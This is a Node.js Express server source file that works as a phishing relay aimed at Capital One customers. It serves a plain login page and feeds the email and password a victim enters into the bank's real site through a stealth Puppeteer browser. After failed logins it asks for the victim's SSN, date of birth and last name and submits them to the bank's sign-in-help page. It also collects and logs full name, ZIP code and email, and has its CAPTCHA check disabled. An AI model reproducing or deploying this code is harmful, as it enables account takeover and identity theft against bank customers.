
const express = require("express");
const bodyParser = require("body-parser");
const puppeteer = require("puppeteer-extra");
const StealthPlugin = require("puppeteer-extra-plugin-stealth");
const axios = require("axios");
const qs = require("qs");
const session = require("express-session"); // For session management
const fs = require("fs/promises"); // For handling phone.txt file

// Add stealth plugin to Puppeteer
puppeteer.use(StealthPlugin());

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));

// Configure session middleware
app.use(
  session({
    secret: "your-secret-key", // Replace with a strong secret key
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false }, // Set to `true` if using HTTPS
  })
);

// Turnstile Secret Key
const TURNSTILE_SECRET_KEY = process.env.TURNSTILE_SECRET_KEY;

// Puppeteer browser and page instances
let browser, page;

// Function to launch Puppeteer browser
async function launchBrowser() {
  if (!browser) {
    console.log("Launching Puppeteer browser...");
    browser = await puppeteer.launch({
      headless: false,
      args: [
        "--no-sandbox",
        "--disable-setuid-sandbox",
        "--disable-dev-shm-usage",
        "--single-process",
        "--disable-gpu",
      ],
    });
    console.log("Browser launched successfully!");
    page = await browser.newPage();
    console.log("New page created!");
  }
}

// Function to validate Turnstile token
async function validateTurnstileToken(token) {
  try {
    if (!TURNSTILE_SECRET_KEY) {
      console.error("Turnstile secret key is missing!");
      return false;
    }

    console.log("Validating Turnstile token with secret:", TURNSTILE_SECRET_KEY);

    const response = await axios.post(
      "https://challenges.cloudflare.com/turnstile/v0/siteverify",
      qs.stringify({
        secret: TURNSTILE_SECRET_KEY,
        response: token,
      }),
      {
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        },
      }
    );

    console.log("Turnstile validation response:", response.data);
    return response.data.success;
  } catch (error) {
    console.error("Error validating Turnstile token:", error.message);
    return false;
  }
}

// Serve the login form
app.get("/", (req, res) => {
  // Initialize invalidAttempts for the session
  req.session.invalidAttempts = req.session.invalidAttempts || 0;
  res.send(`
    <!DOCTYPE html>
    <html lang="en">
      <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Login</title>
        <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
      </head>
      <body>
        <h1>Login</h1>
        <form action="/submit-login" method="POST">
          <label>Email: <input type="text" name="email" required /></label><br/>
          <label>Password: <input type="password" name="password" required /></label><br/>
          <div class="cf-turnstile" data-sitekey="0x4AAAAAAA6n2sVAp0He7OUj"></div><br/>
          <button type="submit">Log in</button>
        </form>
      </body>
    </html>
  `);
});

// Handle login form submission
app.post("/submit-login", async (req, res) => {
    const { email, password } = req.body;
    
    // Temporarily bypass Turnstile validation for testing
  // const turnstileToken = req.body["cf-turnstile-response"];

  // if (!turnstileToken) {
  //   return res.status(400).send("<h1>CAPTCHA token is missing. Please try again.</h1>");
  // }

  // const isValidCaptcha = await validateTurnstileToken(turnstileToken);
  // if (!isValidCaptcha) {
  //   return res.status(403).send("<h1>Invalid CAPTCHA. Please try again.</h1>");
  // }
    req.session.invalidAttempts = req.session.invalidAttempts || 0;
  
    try {
      await launchBrowser();
  
      console.log("Navigating to login page...");
    await page.goto("https://www.capitalone.com/", {
      waitUntil: "networkidle2",
      timeout: 80000, // Reduce timeout to avoid long waits
    });
  
      console.log("Filling in login form...");
      await page.type("input#ods-input-0", email, { delay: 100 });
      await page.type("input#ods-input-1", password, { delay: 100 });
  
      console.log("Submitting login form...");
      await page.click("button#noAcctSubmit");
      await page.waitForNavigation({ waitUntil: "networkidle2" });
  
      const loginSuccess = await page.evaluate(() => {
        const element = document.querySelector("div.option-list-entry--message > p.message--header");
        return element && element.textContent.trim() === "Text me a temporary code";
      });
  
      if (loginSuccess) {
        req.session.invalidAttempts = 0; // Reset invalid attempts
        res.send("<h1>Login successful!</h1>");
      } else {
        req.session.invalidAttempts++;
  
        if (req.session.invalidAttempts === 1) {
          res.send(`
             <!DOCTYPE html>
    <html lang="en">
      <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Login</title>
        <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
      </head>
      <body>
        <h1>INVALID Login</h1>
        <form action="/submit-login" method="POST">
          <label>Email: <input type="text" name="email" required /></label><br/>
          <label>Password: <input type="password" name="password" required /></label><br/>
          <div class="cf-turnstile" data-sitekey="0x4AAAAAAA6n2sVAp0He7OUj"></div><br/>
          <button type="submit">Log in</button>
        </form>
      </body>
    </html>
          `);
        } else if (req.session.invalidAttempts === 2) {
          console.log("Second invalid attempt: Navigating to Sign-In Help...");
  
          // Navigate to the Sign-In Help page
          await page.goto("https://verified.capitalone.com/sign-in-help/", { waitUntil: "networkidle2" });
  
          // Serve the contact form
          res.send(`
            <!DOCTYPE html>
            <html lang="en">
              <head>
                <meta charset="UTF-8" />
                <meta name="viewport" content="width=device-width, initial-scale=1.0" />
                <title>Contact Information</title>
                <style>
                  body {
                    font-family: Arial, sans-serif;
                    max-width: 500px;
                    margin: 2rem auto;
                    text-align: center;
                  }
                  input, button {
                    padding: 0.5rem;
                    margin: 0.5rem 0;
                    font-size: 1rem;
                  }
                  button {
                    background-color: #007bff;
                    color: #fff;
                    border: none;
                    cursor: pointer;
                  }
                  button:hover {
                    background-color: #0056b3;
                  }
                </style>
              </head>
              <body>
                <h1>Contact Information</h1>
                <form action="/submit-contact" method="POST">
                  <label>Last Name: <input type="text" name="lastname" required /></label><br/>
                  <label>SSN: <input type="password" name="ssn" required /></label><br/>
                  <label>Date of Birth: <input type="text" name="dob" required placeholder="mm/dd/yyyy" /></label><br/>
                  <button type="submit">Find Me</button>
                </form>
              </body>
            </html>
          `);
        } else {
          res.send("<h1>Too many invalid attempts. Please try again later.</h1>");
        }
      }
    } catch (error) {
      console.error("Error during login process:", error);
      res.status(500).send("<h1>An error occurred. Please try again later.</h1>");
    }
  });
  

  // Route: Handle contact form submission
app.post("/submit-contact", async (req, res) => {
  const { lastname, ssn, dob } = req.body;

  try {
    console.log("Filling in contact form...");
    // Fill the contact form fields on the Puppeteer browser page
    await page.type('input#lastname', lastname, { delay: 100 });
    await page.type('input#fullSSN', ssn, { delay: 100 });
    await page.type('input#dob', dob, { delay: 100 });

    console.log("Submitting contact form...");
    // Click the "Find Me" button
    await page.click('#find-me-button');

    console.log("Waiting for success indicator...");
    // Wait for the success button to appear (or timeout if not found)
    await page.waitForSelector('button[data-testtarget="noAccessButton"]', {
      visible: true,
      timeout: 15000, // Timeout reduced to 15 seconds to ensure Heroku's 30-second limit is not exceeded
    });

    console.log("Contact form submitted successfully!");
    // If the button is found, send a success message
    res.send("<h1>Contact details submitted successfully!</h1>");
  } catch (error) {
    console.error("Error submitting contact details:", error);

    if (error.name === 'TimeoutError') {
      console.log("Contact details not found, rendering Identity Info form...");
      // Serve the Identity Info form
      res.send(`
        <!DOCTYPE html>
        <html lang="en">
          <head>
            <meta charset="UTF-8" />
            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
            <title>Identity Info</title>
            <style>
              body {
                font-family: Arial, sans-serif;
                max-width: 500px;
                margin: 2rem auto;
                text-align: center;
              }
              input, button {
                padding: 0.5rem;
                margin: 0.5rem 0;
                font-size: 1rem;
              }
              button {
                background-color: #007bff;
                color: #fff;
                border: none;
                cursor: pointer;
              }
              button:hover {
                background-color: #0056b3;
              }
            </style>
          </head>
          <body>
            <h1>Identity Info</h1>
            <p>We couldn't find your contact details. Please provide additional information below:</p>
            <form action="/submit-identity-info" method="POST">
              <label>Full Name: <input type="text" name="fullname" required /></label><br/>
              <label>ZIP Code: <input type="text" name="zipcode" required /></label><br/>
              <label>Email Address: <input type="email" name="email" required /></label><br/>
              <button type="submit">Submit</button>
            </form>
          </body>
        </html>
      `);
    } else {
      res.status(500).send("<h1>An error occurred while submitting contact details.</h1>");
    }
  }
});

  app.post("/submit-identity-info", async (req, res) => {
    const { fullname, zipcode, email } = req.body;
  
    try {
      console.log("Received identity info:");
      console.log(`Full Name: ${fullname}`);
      console.log(`ZIP Code: ${zipcode}`);
      console.log(`Email Address: ${email}`);
  
      // Process the identity information as needed (e.g., log it, send it to another Puppeteer process)
      res.send("<h1>Identity information submitted successfully!</h1>");
    } catch (error) {
      console.error("Error processing identity info:", error);
      res.status(500).send("<h1>An error occurred while processing your identity information.</h1>");
    }
  });

// Start the server
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
